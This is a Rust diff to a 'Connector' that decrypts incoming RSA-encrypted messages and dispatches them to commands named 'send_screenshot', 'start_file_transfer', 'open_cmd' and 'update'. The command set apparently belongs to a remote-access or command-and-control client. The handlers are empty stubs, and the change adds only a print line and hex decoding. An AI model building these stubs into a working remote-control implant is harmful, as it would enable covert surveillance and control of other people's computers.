@@ -98,7 +98,9 @@ impl Connector {
             if let Some(message) = self.read.as_mut().unwrap().next().await {
                 let decrypted_message = self.decrypt_data(message.unwrap().to_string().as_bytes());
                 match decrypted_message.as_str() {
-                    "update" => {}
+                    "update" => {
+                        println!("got an update request");
+                    }
                     "start_file_transfer" => {}
                     "send_screenshot" => {}
                     "open_cmd" => {}
@@ -160,7 +162,10 @@ impl Connector {
             .to_vec()
     }
     pub fn decrypt_data(&self, data: &[u8]) -> String {
-        let decrypted_data = self.private_key.decrypt(Pkcs1v15Encrypt, &data).unwrap();
+        let decrypted_data = self
+            .private_key
+            .decrypt(Pkcs1v15Encrypt, hex::decode(data).unwrap().as_slice())
+            .unwrap();
         String::from_utf8(decrypted_data).unwrap()
     }
 }
